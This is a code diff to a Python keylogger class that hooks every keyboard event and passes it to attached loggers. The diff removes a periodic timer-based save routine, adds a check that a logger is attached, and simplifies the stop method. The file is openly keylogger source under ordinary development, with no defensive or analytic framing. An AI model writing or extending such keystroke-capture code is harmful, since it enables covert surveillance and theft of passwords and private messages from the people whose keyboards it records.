@@ -9,7 +9,6 @@ import logger
 class Keylogger:
     def __init__(self):
         self.__loggers = []
-        self.__timer = None
 
         # log each key pressed
         keyboard.hook(callback=self._on_event)
@@ -24,19 +23,10 @@ class Keylogger:
         logger.on_detached()
         return self
 
-    def save_each(self, seconds: int):
-        # save each attached logger
-        for logger in self.__loggers:
-            logger.save()
-
-        # call this function again in `seconds` seconds
-        self.__timer = threading.Timer(interval=seconds, function=self.save_each, args=[[seconds]])
-        self.__timer.daemon = True     # set the thread as daemon (dies when main thread dies)
-        self.__timer.start()
-
-        return self
-    
     def wait(self):
+        if len(self.__loggers) == 0:
+            raise Exception('No logger attached')
+
         try:
             while True:
                 time.sleep(1e6)
@@ -46,10 +36,7 @@ class Keylogger:
         except KeyboardInterrupt:
             self.stop()
 
-    def stop(self, *_):
-        if self.__timer:
-            self.__timer.cancel()
-
+    def stop(self):
         for logger in self.__loggers:
             logger.close()
 
